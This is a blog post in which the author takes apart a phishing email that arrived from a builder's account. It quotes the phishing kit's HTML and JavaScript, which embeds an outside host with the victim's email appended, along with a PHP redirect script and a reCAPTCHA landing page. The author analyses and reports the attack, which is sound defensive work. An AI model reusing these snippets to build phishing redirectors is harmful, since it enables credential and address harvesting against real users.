+++
title = "Breaking Down a Phishing Attempt"
date = 2022-05-10T06:56:11Z
description = "A look at a phishing attempt on me today"
draft = false
tags = ["security"]
tracking_area = "javascript"
tracking_id = ""
+++

Today my wife and I received the following email from our builder:

![Phishing email](/images/2022-05-10-breaking-down-a-phishing-attempt/01.png)

Well, more specifically, we received it from the sales consultant at the builder who we did the initial tender through about 2 years ago and haven't been in contact with since.

So, getting an email from them seemed somewhat weird, but at the same time, we're just about finished with our build so we thought it might be some closing paperwork.

But it wasn't, it was a [phishing attack](https://en.wikipedia.org/wiki/Phishing), and a pretty darn impressive one at that. If you look at the email you'll notice (redacted) email footer with disclaimer, this was all correct details, down to the mobile phone number of the individual and the text in the disclaimer, it all matches with previous emails we'd had.

The email came into the joint email account my wife and I share, I didn't read it but she asked me why she couldn't access it - she needed the password to the joint account to do so. This triggered a red flag with me so I decided to have a look at it.

## Legit on first pass

What really got me about this was just how _real_ the email looked, it's attempting to mimic the information rights management (IRM) of M365 which allows you to share a document from our SharePoint environment to someone outside of your organisation. It works by sending them back to your M365 tenant where you have to provide an access token and your email (token is emailed separately) to then give you access to the document.

It's really cool tech for allowing a company to share sensitive content to people outside of their organisation in a trusted way, and still hold onto the trust aspect, rather than just emailing attachments which you can't track ownership of, or be sure they haven't been intercepted in a person-in-the-middle attack.

But it seemed a bit _off_ with the text in the email, _Good Day, Please see attached._. This is not the best english and the use of capitalisation seems _off_, indicating that something isn't quite right about it.

Time to snoop.

## Where's the link go

There's a big **View Message** button in the middle, which you're obviously meant to click, and this is the start of the attack. Hovering over the link it clearly wasn't right, it was going to `https://8097685657-evkpl8.codesandbox.io/?email=`.

I'm pretty confident that M365 IRM isn't running on codesandbox.io, but let's take a look at it anyway.

![Phishing site](/images/2022-05-10-breaking-down-a-phishing-attempt/02.png)

Ok, interesting, a ReCapture challenge and a submit button, that's not that interesting. I popped the browser devtools and had a look around, still, nothing that interesting, but given it's on codesandbox, we can have a look at the raw files at `https://codesandbox.io/s/8097685657-evkpl8`.

## Digging through the code

There's four files in the "app", a `package.json` and `sandbox.config.json`, both of which were clearly just generated from a basic template, then there's the `index.html` that we get served:

```html
<object
    data="https://contelis.com.br/wp?email="
    id="obj"
    width="100%"
    height="100%"
    type="text/html"
>
    Link Expired
</object>

<script type="text/javascript">
    function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(
            /[?&]+([^=&]+)=([^&]*)/gi,
            function(m, key, value) {
                vars[key] = value;
            }
        );
        return vars;
    }

    var email = window.location.hash.substr(1);
    if (!email) {
        var email = getUrlVars()["email"];
        document
            .getElementById("obj")
            .setAttribute("data", "https://contelis.com.br/wp?email=" + email);
    } else {
        document
            .getElementById("obj")
            .setAttribute("data", "https://contelis.com.br/wp?email=" + email);
    }
</script>
```

So it's looking at the `email` query string and then loading up another website in an `<object>` tag, which it full screens. This means that the page `https://contelis.com.br/wp` is really where the code lives.

Interestingly enough, there's also a `index.php` file:

```php
<?php
 $oslo=rand();
 $praga=md5($oslo);
 $url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 parse_str(parse_url($url, PHP_URL_QUERY));
 $domain = explode('@', $email);

 $domain_check = '@'.strtolower($domain[1]);

 if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
  header('Location: https://'.$praga.'-kve7vl.csb.app'.$email);
 }

 else {
  header('Location: https://'.$praga.'-kve7vl.csb.app'.$email);
 }

?>
```

It's been a **long** time since I've written PHP but my understanding of the code is that it looks at the email address, and if it's a "microsoft" property, you get redirected to one site, otherwise you get directed to a different site, all using the `Location` header... although if I understand the code right, you end up at the same site regardless, and both sites seem to be on codesandbox as well, as `csb.app` is the short link that they use.

Following that link lands you at an identical codesandbox by the same author, so I'm unsure exactly what the point of it is, my guess is that it's only part of a file, maybe the one of `contelis.com.br`.

Speaking of page at `contelis.com.br`, it's really simple HTML, all it's doing it loading up ReCapture and interestingly enough, the **actual** ReCapture, not some mock up, so you can fail it!

```html
<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <script
            src="https://www.google.com/recaptcha/api.js"
            async
            defer
        ></script>
    </head>

    <body>
        <center>
            <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
            <form method="POST" action="">
                <div class="form-group">
                    <div
                        class="g-recaptcha"
                        name="g-recaptcha"
                        data-sitekey="6Lfx39ofAAAAAHjix51F6EBGCmAppT-UVw0CNdQO"
                    ></div>
                </div>
                <br /><button
                    style="width: 100px; height: 50px;"
                    type="submit"
                    name="submit"
                >
                    submit
                </button>
            </form>
        </center>
    </body>
</html>
```

There's no `<input>` fields on the page, so you're not going to be submitting any _new_ data to the server, so my guess is that there's something server-side that I can't see, probably storing the value of the `email` query string. I also do like the use of the `<br>` tag to add whitespace, plus a `<center>` tag - HTML at its finest!

## What's the point

This is about as far as I was about to dig through and it left me wondering just what the point of this phishing attack was. My guess is that it's being used to harvest email addresses and verify that they are legit by looking at who clicked through the email, essentially, generating a database of "gullible fools" that would click on this sort of thing.

But looking at the email source the query string was **never** set, meaning that the point of capturing the email by using the information on the click through never did work - it was just not there, so I'm a bit at a loss.

The other thing I found fascinating is the level of sophistication in the email, down to the footer with contact details of the original victim and that the email headers suggest it came from the building companies systems. This suggests that it was probably done through a virus on the original victims machine, rather than a random phishing service.

We contacted the builder and informed them of the email and a few hours later an email from the CEO went out addressing it and apologising, so I'm glad they acknowledged the problem.

I've also reported the account to codesandbox, so it'll be up to them to take it down.

Overall, it was a bit of fun pulling this little attempt at phishing me apart.
